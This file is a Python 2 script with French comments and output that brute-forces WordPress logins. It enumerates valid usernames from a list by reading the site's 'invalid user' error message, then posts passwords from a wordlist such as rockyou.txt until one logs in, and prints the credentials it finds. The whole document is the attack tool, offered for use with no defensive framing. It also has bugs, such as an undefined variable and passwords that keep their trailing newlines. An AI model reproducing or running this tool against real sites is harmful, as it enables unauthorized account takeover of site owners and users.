#!/usr/bin/env python
#-*-coding:UTF-8-*-
import pycurl,re,argparse,os,time,datetime
from StringIO import StringIO
from urllib import urlencode
import lib.ProgressBar as ProgressBar

#####################################################################################
#                                       Variable Globale                            #
#####################################################################################



def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url",required=True,help="Select the URL target. Example: -u http://wwww.google.fr")
    parser.add_argument("--user",help="file content all users you want to use. Example: --user login.txt")
    parser.add_argument("--pwd",help="file content all password you want to use. Example: --pwd rockyou.txt")
    return parser.parse_args()

#####################################################################################
# Description de la fonction									                    #
# @param param : le paramètre                                                       #
# @return return : le paramètre de retour		                                    #
#####################################################################################
def brutforcePasswd(user,pwdFile):
    try:
        with open('%s' %pwdFile,"r") as file:
            line=getNumberLine(pwdFile)
            for passwd in file:
                reciveBody=StringIO()
                curl = pycurl.Curl()

                postData={'log':user,'pwd':passwd,'wp-submit':'Se+connecter','redirect_to':redirectTo}
                postFields=urlencode(postData)
                curl.setopt(curl.URL,url)
                curl.setopt(curl.POSTFIELDS, postFields)
                curl.setopt(curl.WRITEDATA, reciveBody)
                curl.perform()
                if curl.getinfo(curl.RESPONSE_CODE) != 200:
                    print('Status: %d' % curl.getinfo(curl.RESPONSE_CODE))
                page=reciveBody.getvalue()
                status=re.search('login_error.*',page)
                if not status:
                    return passwd
    except IOError,error:
        print "{}".format(error)

def brutforceId(userFile):
    try:
        with open('%s'%userFile,"r") as file:
            for user in file:
                reciveBody=StringIO()
                curl = pycurl.Curl()
                user=user.replace('\n','')
                postData={'log':user,'pwd':'passwd','wp-submit':'Se+connecter','redirect_to':redirectTo}
                postFields=urlencode(postData)
                curl.setopt(curl.URL,url)
                curl.setopt(curl.POSTFIELDS, postFields)
                curl.setopt(curl.WRITEDATA, reciveBody)
                curl.perform()
                if curl.getinfo(curl.RESPONSE_CODE) != 200:
                    print('Status: %d' % curl.getinfo(curl.RESPONSE_CODE))
                page=reciveBody.getvalue()
                status=re.search('login_error.*',page)
                errorStatus=re.search('utilisateur\snon\svalide',status.group(0))
                curl.close()
                if not errorStatus:
                    return user
    except Exception as error:
        print "{}".format(error)

def getNumberLine(fileName):
    file=open("%s"%fileName,"r")
    lines=len(file.readlines())
    file.close()
    return lines
def convertToH(seconds):
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    time="{}:{}:{}".format(int(h),int(m),int(s))
    return time

args=parse_args()
url=args.url
pwdFile=args.pwd
userFile=args.user
urlBase=url.split('/')
redirectTo=urlBase[0]+"/wp-admin/&testcookie=1"
tps1 = time.time()
user=brutforceId(userFile)
if user:
    passwd=brutforcePasswd(user,pwdFile)
    tps2 = time.time()
    totalTime=tps2-tps1
    totalTime=convertToH(totalTime)
    if passwd:
        print """
L'identifiant et le mot de passe ont été trouvé en {}

        identifiant: {}
        mot de passe: {}
        """.format(totalTime,user,passwd)
    else:
        print """
l'identifiant à été trouvé en {} mais pas le mot de passe, merci d'indiquer un autre fichier de mot de passe

        identifiant :{}""".format(totalTimetime, user)
else:
    print """Utilisateur et mot de passe non trouvé.

merci d'indiquer d'autres fichiers"""
